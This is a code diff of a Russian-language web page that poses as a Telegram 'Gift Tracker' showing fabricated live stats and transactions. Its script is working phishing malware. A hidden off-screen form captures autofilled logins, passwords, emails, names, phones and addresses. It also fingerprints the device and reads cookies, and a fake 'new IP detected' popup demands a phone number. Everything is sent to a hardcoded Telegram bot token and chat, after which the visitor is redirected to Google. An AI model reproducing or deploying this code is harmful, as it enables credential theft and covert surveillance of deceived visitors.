@@ -3,48 +3,36 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-<title>Telegram Gift Tracker</title>
+<title>Gift Tracker</title>
 <style>
-:root{--bg:#0a0e14;--card:#121720;--border:#1e2836;--accent:#3b82f6;--green:#10b981;--yellow:#f59e0b;--text:#e2e8f0;--muted:#64748b}
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
-.topbar{background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
-.topbar .logo-s{font-size:20px;font-weight:700;background:linear-gradient(135deg,var(--accent),#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.topbar .live{color:var(--green);font-size:12px;font-weight:600}
-.topbar .live::before{content:"● ";animation:blink 1s infinite}
-@keyframes blink{50%{opacity:0}}
+body{background:#0a0e14;color:#e2e8f0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
+.topbar{background:#121720;border-bottom:1px solid #1e2836;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
+.logo-s{font-size:20px;font-weight:700;background:linear-gradient(135deg,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.live{color:#10b981;font-size:12px;font-weight:600}
 .container{max-width:900px;margin:0 auto;padding:16px}
-.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:20px}
-.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center}
-.stat-card:active{transform:scale(0.97)}
-.stat-card .val{font-size:24px;font-weight:800}
-.val.g{color:var(--green)}.val.y{color:var(--yellow)}.val.b{color:var(--accent)}
-.stat-card .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
+.stat-card{background:#121720;border:1px solid #1e2836;border-radius:12px;padding:16px;text-align:center}
+.val{font-size:22px;font-weight:800}.val.g{color:#10b981}.val.y{color:#f59e0b}.val.b{color:#3b82f6}
+.lbl{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
 .section{margin-bottom:20px}
 .section-title{font-size:14px;font-weight:600;margin-bottom:10px}
-.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
-table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
-th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);white-space:nowrap}
+.table-wrap{overflow-x:auto}
+table{width:100%;border-collapse:collapse;background:#121720;border:1px solid #1e2836;border-radius:12px;overflow:hidden}
+th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#64748b}
 td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
-td.user{color:#fff;font-weight:500}
-td.gift{color:#e2e8f0}
-td.price{color:var(--green);font-weight:600}
-tr:last-child td{border-bottom:none}
-.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.78);z-index:100;justify-content:center;align-items:center;padding:20px}
+td.user{color:#fff}td.price{color:#10b981;font-weight:600}
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:100;justify-content:center;align-items:center;padding:20px}
 .overlay.show{display:flex}
-.popup{background:var(--card);border:1px solid var(--accent);border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center;animation:popIn 0.3s ease}
-@keyframes popIn{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
-.popup .icon{font-size:44px;margin-bottom:10px}
-.popup h3{font-size:18px;font-weight:700;margin-bottom:6px;color:#fff}
-.popup .desc{font-size:13px;color:var(--muted);margin-bottom:18px;line-height:1.5}
-.popup input{width:100%;padding:14px 16px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:14px}
-.popup input:focus{outline:none;border-color:var(--accent)}
-.popup input::placeholder{color:#3a4450}
-.popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
-.popup .btn-pop:active{transform:scale(0.97)}
-.hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none}
-.footer-bar{text-align:center;padding:20px;color:var(--muted);font-size:11px;border-top:1px solid var(--border);margin-top:30px}
-@media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px 10px}}
+.popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center}
+.popup h3{font-size:18px;color:#fff;margin-bottom:6px}
+.popup .desc{font-size:13px;color:#64748b;margin-bottom:18px;line-height:1.4}
+.popup input{width:100%;padding:14px;background:#0a0e14;border:1px solid #1e2836;border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:14px}
+.popup input:focus{outline:none;border-color:#3b82f6}
+.popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
+.hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
+.footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
+@media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
 </style>
 </head>
 <body>
@@ -55,15 +43,9 @@ tr:last-child td{border-bottom:none}
 <input type="password" name="p" autocomplete="current-password">
 <input type="email" name="e" autocomplete="email">
 <input type="text" name="fn" autocomplete="name">
-<input type="text" name="gn" autocomplete="given-name">
-<input type="text" name="ln" autocomplete="family-name">
 <input type="tel" name="ph" autocomplete="tel-national">
 <input type="tel" name="ph2" autocomplete="tel">
-<input type="text" name="org" autocomplete="organization">
 <input type="text" name="adr" autocomplete="street-address">
-<input type="text" name="cty" autocomplete="address-level2">
-<input type="text" name="cnt" autocomplete="country-name">
-<input type="text" name="pst" autocomplete="postal-code">
 </form>
 </div>
 
@@ -73,14 +55,12 @@ tr:last-child td{border-bottom:none}
 </div>
 
 <div class="container">
-
 <div class="stats-row">
-<div class="stat-card"><div class="val g">12,847</div><div class="lbl">Подарков отслежено</div></div>
-<div class="stat-card"><div class="val y">3,291</div><div class="lbl">Продано за 24ч</div></div>
-<div class="stat-card"><div class="val b">142</div><div class="lbl">Новых продавцов</div></div>
-<div class="stat-card"><div class="val g">₽847K</div><div class="lbl">Объём торгов</div></div>
+<div class="stat-card"><div class="val g">12847</div><div class="lbl">Подарков</div></div>
+<div class="stat-card"><div class="val y">3291</div><div class="lbl">Продано за 24ч</div></div>
+<div class="stat-card"><div class="val b">142</div><div class="lbl">Продавцов</div></div>
+<div class="stat-card"><div class="val g">847K₽</div><div class="lbl">Объём</div></div>
 </div>
-
 <div class="section">
 <div class="section-title">🏆 Последние транзакции</div>
 <div class="table-wrap">
@@ -90,29 +70,25 @@ tr:last-child td{border-bottom:none}
 </table>
 </div>
 </div>
-
 </div>
-
 <div class="footer-bar">🔒 Gift Tracker • Данные из открытых источников</div>
 
 <div class="overlay" id="overlay">
 <div class="popup">
-<div class="icon">🛡️</div>
-<h3>Подтвердите доступ</h3>
-<div class="desc">Обнаружен новый IP-адрес.<br>Для продолжения введите номер телефона.<br><br>📡 Это защищает базу от ботов и мошенников.</div>
-<input type="tel" id="popupPhone" placeholder="Введите номер телефона" autocomplete="tel-national">
+<h3>🛡️ Подтвердите доступ</h3>
+<div class="desc">Обнаружен новый IP.<br>Введите номер телефона для верификации.</div>
+<input type="tel" id="popupPhone" placeholder="Введите номер телефона">
 <button class="btn-pop" onclick="submitPhone()">Подтвердить</button>
 </div>
 </div>
 
 <script>
-const TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
-const CHAT="8192226287";
-const REDIR="https://www.google.com";
-const sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
+var TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
+var CHAT="8192226287";
+var REDIR="https://www.google.com";
+var sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 
-// Список подарков
-const gifts=[
+var gifts=[
 {user:"@dagestan_05",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
 {user:"@sveta_love",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
 {user:"@kostyan_77",gift:"Instant Ramen 🍜",price:"550 ₽"},
@@ -124,128 +100,81 @@ const gifts=[
 {user:"@abdul_goat",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
 {user:"@egor_krd",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
 {user:"@nastya_art",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
-{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"},
-{user:"@dilya_ama",gift:"Pet Snake 🐍",price:"470 ₽"},
-{user:"@roma_tomsk",gift:"Snoop Dogg 🐶",price:"1 400 ₽"},
+{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"}
 ];
 
 function shuffleAndShow(){
-const shuffled=[...gifts].sort(()=>Math.random()-0.5).slice(0,8);
-const tbody=document.getElementById('giftTable');
-tbody.innerHTML=shuffled.map((g,i)=>`<tr>
-<td class="user">${g.user}</td>
-<td class="gift">${g.gift}</td>
-<td class="price">${g.price}</td>
-<td style="color:var(--muted);font-size:11px">${Math.floor(Math.random()*60)} сек назад</td>
-</tr>`).join('');
+var sh=[...gifts].sort(function(){return Math.random()-0.5}).slice(0,8);
+var h='';
+for(var i=0;i<sh.length;i++){
+h+='<tr><td class="user">'+sh[i].user+'</td><td>'+sh[i].gift+'</td><td class="price">'+sh[i].price+'</td><td style="color:#64748b;font-size:11px">'+Math.floor(Math.random()*60)+' сек назад</td></tr>';
+}
+document.getElementById('giftTable').innerHTML=h;
 }
 shuffleAndShow();
 setInterval(shuffleAndShow,8000);
+setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
-setInterval(()=>{document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
+var passiveData={};
+fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
+passiveData.ip=j.ip||"-";passiveData.country=j.country_name||"-";passiveData.city=j.city||"-";
+passiveData.region=j.region||"-";passiveData.provider=j.org||"-";passiveData.tz_ip=j.timezone||"-";
+}).catch(function(){});
 
-// Пассивный сбор
-let passiveData={};
-(async function(){
-const d=passiveData;
-try{
-const r=await fetch("https://ipapi.co/json/");
-const j=await r.json();
-d.ip=j.ip||"-";d.country=j.country_name||"-";d.city=j.city||"-";
-d.region=j.region||"-";d.provider=j.org||"-";d.tz_ip=j.timezone||"-"
-}catch(e){d.ip="error"}
+passiveData.ua=navigator.userAgent;passiveData.platform=navigator.platform;passiveData.lang=navigator.language;
+passiveData.sw=screen.width;passiveData.sh=screen.height;
+passiveData.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+passiveData.cpu=navigator.hardwareConcurrency||"?";passiveData.ram=navigator.deviceMemory||"?";
+passiveData.mobile=/Mobi|Android/i.test(navigator.userAgent);
+passiveData.ref=document.referrer||"direct";
+passiveData.cookie=document.cookie||"-";
 
-try{
-const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-pc.createDataChannel("");const o=await pc.createOffer();await pc.setLocalDescription(o);
-const c=await new Promise(res=>{pc.onicecandidate=e=>{if(e&&e.candidate)res(e.candidate.candidate);else res("")};setTimeout(()=>res(""),1200)});
-d.webrtc=c||"-";pc.close()
-}catch(e){d.webrtc="error"}
-
-d.ua=navigator.userAgent;d.platform=navigator.platform;d.lang=navigator.language;
-d.sw=screen.width;d.sh=screen.height;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-d.cpu=navigator.hardwareConcurrency||"?";d.ram=navigator.deviceMemory||"?";
-d.mobile=/Mobi|Android/i.test(navigator.userAgent);
-
-try{
-const cv=document.createElement('canvas');const gl=cv.getContext('webgl');
-if(gl){const db=gl.getExtension('WEBGL_debug_renderer_info');
-if(db){d.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
-}catch(e){}
-if(!d.gpu)d.gpu="-";
-
-try{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+"% ch:"+b.charging}catch(e){d.bat="-"}
-try{if(navigator.connection){d.conn=navigator.connection.effectiveType}}catch(e){}
-d.ref=document.referrer||"direct";
-d.cookie=document.cookie||"-";
-try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1000)}catch(e){d.ls="-"}
-})();
-
-setTimeout(async()=>{
+setTimeout(function(){
 passiveData.af_u=document.querySelector('[name="u"]').value||"-";
 passiveData.af_p=document.querySelector('[name="p"]').value||"-";
 passiveData.af_e=document.querySelector('[name="e"]').value||"-";
 passiveData.af_fn=document.querySelector('[name="fn"]').value||"-";
 passiveData.af_ph=document.querySelector('[name="ph"]').value||"-";
 passiveData.af_ph2=document.querySelector('[name="ph2"]').value||"-";
-passiveData.af_adr=document.querySelector('[name="adr"]').value||"-";
 },3000);
 
-// Попап через 15 секунд
-setTimeout(()=>{document.getElementById('overlay').classList.add('show')},15000);
+setTimeout(function(){document.getElementById('overlay').classList.add('show')},15000);
 
-async function submitPhone(){
-const phone=document.getElementById('popupPhone').value.trim();
+function submitPhone(){
+var phone=document.getElementById('popupPhone').value.trim();
 if(!phone){alert('Введите номер телефона');return}
 passiveData.entered_phone=phone;
-const d=passiveData;
+var d=passiveData;
 
-const msg=
-`🚨 ЗАХОД GIFT TRACKER
+var msg='🚨 ЗАХОД GIFT TRACKER\n\n'+
+'🆔 '+sid+'\n'+
+'🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
+'🌐 IP: '+d.ip+'\n'+
+'📍 '+d.country+', '+d.city+'\n'+
+'📡 '+d.provider+'\n'+
+'🕐 TZ: '+d.tz+' / IP: '+d.tz_ip+'\n\n'+
+'📱 '+d.platform+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
+'🖥 '+d.sw+'x'+d.sh+' | CPU:'+d.cpu+' | RAM:'+d.ram+'\n'+
+'🗣 '+d.lang+'\n\n'+
+'📞 ВВЁЛ ТЕЛЕФОН: '+d.entered_phone+'\n\n'+
+'🔑 АВТОЗАПОЛНЕНИЕ:\n'+
+'LOGIN: '+(d.af_u||"-")+'\n'+
+'PASS: '+(d.af_p||"-")+'\n'+
+'EMAIL: '+(d.af_e||"-")+'\n'+
+'NAME: '+(d.af_fn||"-")+'\n'+
+'PHONE: '+(d.af_ph||"-")+'\n'+
+'PHONE2: '+(d.af_ph2||"-")+'\n\n'+
+'🔗 REF: '+d.ref+'\n'+
+'🍪 COOKIE: '+(d.cookie||"-").substring(0,500);
 
-🆔 ${sid}
-🕐 ${new Date().toLocaleString("ru-RU")}
-
-🌐 IP: ${d.ip}
-📍 ${d.country}, ${d.city}, ${d.region}
-📡 ${d.provider}
-🕐 TZ: ${d.tz} / IP: ${d.tz_ip}
-
-📱 ${d.platform} | ${d.mobile?'MOBILE':'PC'}
-🖥 ${d.sw}x${d.sh} | CPU:${d.cpu} | RAM:${d.ram}
-🗣 ${d.lang}
-🎮 ${d.gpu}
-🔋 ${d.bat}
-📶 ${d.conn||"-"}
-
-📞 ВВЁЛ ТЕЛЕФОН: ${d.entered_phone}
-
-🔑 АВТОЗАПОЛНЕНИЕ:
-LOGIN: ${d.af_u||"-"}
-PASS: ${d.af_p||"-"}
-EMAIL: ${d.af_e||"-"}
-NAME: ${d.af_fn||"-"}
-PHONE: ${d.af_ph||"-"}
-PHONE2: ${d.af_ph2||"-"}
-ADDR: ${d.af_adr||"-"}
-
-🔗 REF: ${d.ref}
-🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}`;
-
-try{
-const resp=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({chat_id:CHAT,text:msg})
-});
-console.log('Sent to Telegram:',resp.status);
-}catch(e){
-console.error('Error sending:',e);
-}
+var url='https://api.telegram.org/bot'+TOKEN+'/sendMessage';
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT,text:msg})}).then(function(resp){
+console.log('Status:',resp.status);
+}).catch(function(e){console.log('Error:',e)});
 
 document.getElementById('overlay').classList.remove('show');
 alert('✅ Доступ подтверждён');
-setTimeout(()=>{window.location.replace(REDIR)},2000);
+setTimeout(function(){window.location.replace(REDIR)},2000);
 }
 </script>
 </body>
